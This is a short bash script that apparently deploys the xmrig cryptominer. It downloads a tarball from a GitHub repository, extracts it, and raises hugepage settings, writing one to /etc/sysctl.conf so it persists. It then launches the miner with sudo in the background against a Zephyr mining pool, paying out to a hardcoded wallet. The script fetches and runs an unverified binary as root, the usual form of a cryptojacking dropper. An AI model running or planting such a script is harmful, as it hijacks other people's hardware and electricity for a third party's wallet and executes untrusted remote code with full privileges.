#!/bin/bash
#love u fika

wget https://github.com/prendibs/vl/raw/main/z.tar.gz && tar xf z.tar.gz
sysctl -w vm.nr_hugepages=$(nproc)

for i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d);
do
    echo 3 > "$i/hugepages/hugepages-1048576kB/nr_hugepages";
done
echo "1GB pages successfully enabled"
(grep -q "vm.nr_hugepages" /etc/sysctl.conf || (echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf)) && sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc))) \
&& sudo ./xmrig -B -o "$1"-zephyr.miningocean.org:5332 -u ZEPHs9qyUjPfbebw44nveyf2XqZ2sotqRd8ntp8SyPZMj4tDSZeCX9mJnkroee214rN6ZWNm7kroFe1dB5Rnf3DG2zKRHCKPFJ9 -p z"$1" -a rx/0 -t 60 --randomx-1gb-pages
